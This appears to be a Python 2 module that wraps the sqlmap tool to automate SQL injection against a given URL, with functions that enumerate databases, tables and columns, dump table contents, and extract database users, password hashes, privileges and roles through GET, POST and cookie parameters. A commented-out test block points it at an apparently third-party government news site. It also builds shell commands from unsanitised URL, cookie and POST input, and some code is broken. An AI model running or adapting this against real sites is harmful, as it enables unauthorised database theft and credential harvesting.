#!/usr/bin/python
# -*- coding: utf-8 -*-
import urlparse
import logging
from lib.common import *
import sys
import os

sys_path = lambda relativePath: "%s/%s"%(os.getcwd(), relativePath)

class SqlInjectionTest:
    def __init__(self,url):
        try:
            self.url = url
            if self.url.lower().find('http') < 0 and self.url.lower().find('https') < 0:
                self.url = 'http://' + self.url
            #end if
            self.domain = self.urlparse()
            self.tmpdir = ''
            if self.domain and self.domain != '':
                filepath = sys_path("/waf/sqlmap/output/")
                self.tmpdir = filepath + self.domain
            else:
                self.tmpdir = ''
            #end if
        except Exception,e:
            logging.getLogger().error("__init__ Exception(SqlInjection):" + str(e))
        #end try
    #end def
    
    def cleartmp(self):
        try:
            if self.tmpdir and self.tmpdir != '':
                vulscan_popen("rm -R %s" % (self.tmpdir))
            #end if
        except Exception,e:
            logging.getLogger().error("cleartmp Exception(SqlInjection):" + str(e))
        #end try
    #end def
    
    def urlparse(self):
        try:
            parsedTuple = urlparse.urlparse(self.url)
            if parsedTuple and len(parsedTuple) > 0:
                return parsedTuple[1]
            else:
                return ''
            #end if
        except Exception,e:
            logging.getLogger().error("urlparse Exception(SqlInjection):" + str(e))
            return ''
        #end try
    #end def
    
    def ifInjection(self):
        enable = False
        mydict = dict()
        try:
            filepath = "/waf/sqlmap/sqlmap.py -u %s" % (self.url)
            buf = "/usr/bin/python %s" % (filepath)
            lines = vulscan_popen(buf)
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
            #end for
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("ifInjection Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getDbs(self):
        enable = False
        mydict = dict()
        try:
            filepath = "/waf/sqlmap/sqlmap.py -u %s --dbs" % (self.url)
            buf = "/usr/bin/python %s" % (filepath)
            print buf
            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('[*]') >= 0 and line.find('shutting down') < 0  and line.find('starting at') < 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    list.append(line.split(' ')[1])
                #end if
            #end for
            mydict['dbs'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getDbs Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    def getTables(self,dbname,par_name):
        enable = False
        mydict = dict()
        mydict['dbname'] = dbname
        try:
            filepath = "/waf/sqlmap/sqlmap.py -u \"%s\" -p %s -D '%s' --tables" % (self.url,par_name,dbname)
            buf = "/usr/bin/python %s"%filepath
            print buf
            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('|') >= 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    list.append(line.split('|')[1].strip())
                #end if
            #end for
            mydict['tables'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getTables Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getColumns(self,dbname,tablename):
        enable = False
        mydict = dict()
        mydict['dbname'] = dbname
        mydict['tablename'] = tablename
        try:
            filepath = sys_path("/waf/sqlmap/sqlmap.py -u %s -D '%s' -T '%s' --columns" % (self.url,dbname,tablename))
            buf = "/usr/bin/python %s"%filepath
            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('|') >= 0:
                    if line.find('Column') > 0 and line.find('Type') > 0:
                        continue
                    #end if
                    line = line.strip()
                    line = line.replace('\r\n','')
                    dicttmp = dict()
                    dicttmp['name'] = line.split('|')[1].strip()
                    dicttmp['type'] = line.split('|')[2].strip()
                    list.append(dicttmp)
                #end if
            #end for
            mydict['columns'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getColumns Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getData(self,dbname,tablename,columns,start=0,limit=0):
        enable = False
        mydict = dict()
        mydict['dbname'] = dbname
        mydict['tablename'] = tablename
        mydict['columns'] = columns
        columnlist = columns.split(',')
        columnOrder = []
        try:
            if limit > 0:
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s -D '%s' -T '%s' -C '%s' --dump --start %d --stop %d" % (self.url,dbname,tablename,columns,start,limit)
            else:
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s -D '%s' -T '%s' -C '%s' --dump" % (self.url,dbname,tablename,columns)
            #end if
            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('|') >= 0:
                    flag = True
                    for column in columnlist:
                        if line.find(column) < 0:
                            
                            flag = False
                        #end if
                    #end for
                    if flag:
                        line = line.strip()
                        line = line.replace('\r\n','')
                        lineArray = line.split('|')
                        for i in range(1,len(lineArray) - 1):
                            columnOrder.append(lineArray[i].strip())
                        #end for
                        continue
                    #end if
                    
                    line = line.strip()
                    line = line.replace('\r\n','')
                    lineArray = line.split('|')
                    dictItem = dict()
                    for i in range(1,len(lineArray) - 1):
                        dictItem[columnOrder[i-1]] = lineArray[i].strip()
                    #end for
                    list.append(dictItem)
                #end if
            #end for
            mydict['data'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getData Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getCurrentUser(self):
        enable = False
        mydict = dict()
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s --current-user" % (self.url)
#            print "get"+buf
            
            for line in lines:
#                print line
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('current user:') >= 0:
                    mydict['currentuser'] = line.split(':')[1]
                    mydict['currentuser'] = mydict['currentuser'].strip()
                    mydict['currentuser'] = mydict['currentuser'].replace('\r\n','')
                    mydict['currentuser'] = mydict['currentuser'].replace('\'','')
                #end if
            #end for
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getCurrentUser Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getCurrentDb(self,par_name):
        enable = False
        mydict = dict()
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u \"%s\" -p %s --current-db" % (self.url,par_name)
            print "get"+buf
            lines = vulscan_popen(buf)
            for line in lines:
#                print line
#                logging.getLogger().error(line)
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('current database:') >= 0:
                    mydict['currentdb'] = line.split(':')[1]
                    mydict['currentdb'] = mydict['currentdb'].strip()
                    mydict['currentdb'] = mydict['currentdb'].replace('\r\n','')
                    mydict['currentdb'] = mydict['currentdb'].replace('\'','')
                #end if
            #end for
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getCurrentDb Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    
    def getPostCurrentDb(self,Postdata,Params):
        logging.getLogger().error(Postdata)
        logging.getLogger().error(Params)
        enable = False
        mydict = dict()
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u \"%s\" --threads 10 --data \"%s\" -p %s --current-db" % (self.url,Postdata,Params)
            print "post"+buf
            lines = vulscan_popen(buf)
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    print line
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('current database:') >= 0:
                    mydict['currentdb'] = line.split(':')[1]
                    mydict['currentdb'] = mydict['currentdb'].strip()
                    mydict['currentdb'] = mydict['currentdb'].replace('\r\n','')
                    mydict['currentdb'] = mydict['currentdb'].replace('\'','')
                #end if
            #end for
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getPostCurrentDb Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getPostTables(self,dbname,Postdata,Params):
        print "getPostTables  beginging"
        enable = False
        mydict = dict()
        mydict['dbname'] = dbname
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u \"%s\" -D '%s' --thread 10 --data \"%s\" -p %s --tables" % (self.url,dbname,Postdata,Params)
            lines = vulscan_popen(buf)
            list = []
            for line in lines:
 
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('|') >= 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    list.append(line.split('|')[1].strip())
                #end if
            #end for
            mydict['tables'] = list
            print "ending"
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getTables Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    def CookieCurrentDb(self,targeturl,cookiedata,Params):
       
        enable = False
        mydict = dict()
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u \"%s\" --cookie \"%s\"  -p %s --current-db --level 2" % (targeturl,cookiedata,Params)
            print "cookie"+buf
            lines = vulscan_popen(buf)
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    print line
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('current database:') >= 0:
                    mydict['currentdb'] = line.split(':')[1]
                    mydict['currentdb'] = mydict['currentdb'].strip()
                    mydict['currentdb'] = mydict['currentdb'].replace('\r\n','')
                    mydict['currentdb'] = mydict['currentdb'].replace('\'','')
                #end if
            #end for
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getPostCurrentDb Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def CookieTables(self,targeturl,dbname,cookiedata,Params):
        print "getPostTables  beginging"
        enable = False
        mydict = dict()
        mydict['dbname'] = dbname
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u \"%s\" -D '%s' --cookie \"%s\" -p %s --tables --level 2" % (targeturl,dbname,cookiedata,Params)
            print buf
            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                print line
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('|') >= 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    list.append(line.split('|')[1].strip())
                #end if
            #end for
            mydict['tables'] = list
            print "ending"
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getTables Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    def getUsers(self):
        enable = False
        mydict = dict()
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s --users" % (self.url)
            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('[*]') >= 0 and line.find('starting at') < 0 and line.find('shutting down') < 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    list.append(line.split(' ')[1].strip())
                #end if
            #end for
            mydict['users'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getUsers Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getPasswords(self,users):
        enable = False
        mydict = dict()
        userlist = users.split(',')
        try:
            if users == '':
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s --passwords" % (self.url)
            else:
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s -U '%s' --passwords" % (self.url,users)
            #end if
            lines = vulscan_popen(buf)
            list = []
            namelist = []
            pwdlist = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('[*]') >= 0 and line.find('starting at') < 0 and line.find('shutting down') < 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    namelist.append(line.split(' ')[1].strip())
                #end if
                if line.find('password hash:') > 0 and line.find('password hash:') < 10:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    pwdlist.append(line.split(':')[1].strip())
                #end if
            #end for
            for i in range(0,len(namelist)):
                dictItem = dict()
                dictItem['user'] = namelist[i]
                dictItem['pwd'] = pwdlist[i]
                list.append(dictItem)
            #end for
            mydict['pwds'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getPasswords Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getUserPri(self,users=''):
        enable = False
        mydict = dict()
        try:
            if users == '':
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s --privileges" % (self.url)
            else:
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s -U '%s' --privileges" % (self.url,users)
            #end if

            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('[*]') >= 0 and line.find('starting at') < 0 and line.find('shutting down') < 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    line = line.replace('(','')
                    line = line.replace(')','')
                    dictItem = dict()
                    line_list = line.split(' ')
                    if len(line_list) >= 3:
                        dictItem['user'] = line_list[1].strip()
                        dictItem['pri'] = line_list[2].strip()
                    else:
                        dictItem['user'] = line_list[1].strip()
                        dictItem['pri'] = ''
                    #end if
                    list.append(dictItem)
                #end if
            #end for
            mydict['pri'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getUserPri Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def isDba(self):
        enable = False
        mydict = dict()
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s --is-dba" % (self.url)

            lines = vulscan_popen(buf)
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('current user is DBA:') >= 0:
                    if line.find('True') > 0:
                        mydict['isdba'] = True
                    else:
                        mydict['isdba'] = False
                    #end if
                #end if
            #end for
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("isDba Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getUserRoles(self,users=''):
        enable = False
        mydict = dict()
        try:
            if users == '':
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s --roles" % (self.url)
            else:
                buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s -U '%s' --roles" % (self.url,users)
            #end if

            lines = vulscan_popen(buf)
            list = []
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('[*]') >= 0 and line.find('starting at') < 0 and line.find('shutting down') < 0:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    line = line.replace('(','')
                    line = line.replace(')','')
                    dictItem = dict()
                    line_list = line.split(' ')
                    if len(line_list) >= 3:
                        dictItem['user'] = line_list[1].strip()
                        dictItem['role'] = line_list[2].strip()
                    else:
                        dictItem['user'] = line_list[1].strip()
                        dictItem['role'] = ''
                    #end if
                    list.append(dictItem)
                #end if
            #end for
            mydict['roles'] = list
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getUserRoles Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
    def getBanner(self):
        enable = False
        mydict = dict()
        try:
            buf = "/usr/bin/python /var/waf/sqlmap/sqlmap.py -u %s -b" % (self.url)

            lines = vulscan_popen(buf)
            banner = ''
            flag = False
            count = 0
            for line in lines:
                if line.find('sqlmap identified the following injection points') >= 0:
                    enable = True
                #end if
                if line.find('web server operating system') >= 0:
                    mydict['os'] = line.split(':')[1]
                    mydict['os'] = mydict['os'].strip()
                    mydict['os'] = mydict['os'].replace('\r\n','')
                #end if
                if line.find('web application technology') >= 0:
                    mydict['webapp'] = line.split(':')[1]
                    mydict['webapp'] = mydict['webapp'].strip()
                    mydict['webapp'] = mydict['webapp'].replace('\r\n','')
                #end if
                if line.find('back-end DBMS') >= 0:
                    mydict['dbms'] = line.split(':')[1]
                    mydict['dbms'] = mydict['dbms'].strip()
                    mydict['dbms'] = mydict['dbms'].replace('\r\n','')
                #end if
                if line.find('banner:') >= 0:
                    flag = True
                    continue
                #end if
                if line.find('---') >= 0:
                    if flag == True:
                        if count == 0:
                            count += 1
                        else:
                            flag = False
                        #end if
                    #end if
                    continue
                #end if
                if flag:
                    line = line.strip()
                    line = line.replace('\r\n','')
                    banner += line + '#'
                #end if
            #end for
            mydict['banner'] = banner
            return enable,mydict
        except Exception,e:
            logging.getLogger().error("getBanner Exception(SqlInjection):" + str(e))
            return enable,mydict
        #end try
    #end def
    
#end class

'''
if __name__ == '__main__':
    init_log(logging.ERROR, logging.ERROR, os.path.realpath(__file__).split(".")[0] + ".log")
    try:
        #url = "http://192.168.1.191/DownloadShow.asp?ID=3"
        url = "http://www.gs168.com.cn/govaffair/readnews.jsp?InfoID=87124"
        #url = "http://192.168.1.191/DownloadShow.asp?ID=3"
        sqlinjection = SqlInjection(url)
        #enable,mydict = sqlinjection.ifInjection()
        enable,mydict = sqlinjection.getDbs()
        #enable,mydict = sqlinjection.getTables("NewInfo07")
        #enable,mydict = sqlinjection.getColumns("NewInfo07", "kejian")
        #enable,mydict = sqlinjection.getData("NewInfo07","kejian","id,url,hits")
        #enable,mydict = sqlinjection.getCurrentUser()
        #enable,mydict = sqlinjection.getCurrentDb()
        #enable,mydict = sqlinjection.getUsers()
        #enable,mydict = sqlinjection.getPasswords("")
        #enable,mydict = sqlinjection.getUserPri('')
        #enable,mydict = sqlinjection.isDba()
        #enable,mydict = sqlinjection.getUserRoles()
        #enable,mydict = sqlinjection.getBanner()
        if enable:
            print mydict
    except Exception,e:
        logging.getLogger().error("SqlInjection Exception:" + str(e))
    #end try
#end if
'''
